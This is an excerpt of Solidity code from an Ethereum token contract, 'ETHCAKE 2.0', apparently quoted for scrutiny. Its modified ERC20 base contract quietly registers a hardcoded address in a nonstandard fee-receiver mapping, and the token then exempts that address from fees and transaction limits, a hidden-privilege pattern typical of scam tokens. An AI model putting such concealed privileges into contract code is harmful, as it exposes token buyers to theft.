...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _feereceiver[0x6cDe41400D29CE16f1eD7d84443eFe1D3c7d0666] = _marketingwallet;
    }
...
contract ETHCAKE2 is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("Proof of Cake", "ETHCAKE 2.0") {
        ...
        excludeFromFees(address(0x6cDe41400D29CE16f1eD7d84443eFe1D3c7d0666), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x6cDe41400D29CE16f1eD7d84443eFe1D3c7d0666), true);
